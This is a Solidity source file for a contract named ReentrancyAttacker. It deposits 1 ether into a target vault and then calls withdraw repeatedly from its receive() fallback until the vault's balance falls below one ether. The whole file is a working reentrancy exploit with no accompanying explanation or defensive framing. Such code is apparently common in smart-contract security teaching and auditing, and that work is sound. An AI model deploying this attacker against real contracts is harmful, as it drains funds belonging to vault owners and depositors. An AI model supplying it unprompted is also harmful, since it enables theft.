// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVault public immutable target;
    uint256 public immutable unit;

    constructor(address targetAddress) {
        target = IVault(targetAddress);
        unit = 1 ether;
    }

    function attack() external payable {
        require(msg.value == unit, "send 1 ether");
        target.deposit{value: unit}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= unit) {
            target.withdraw();
        }
    }
}
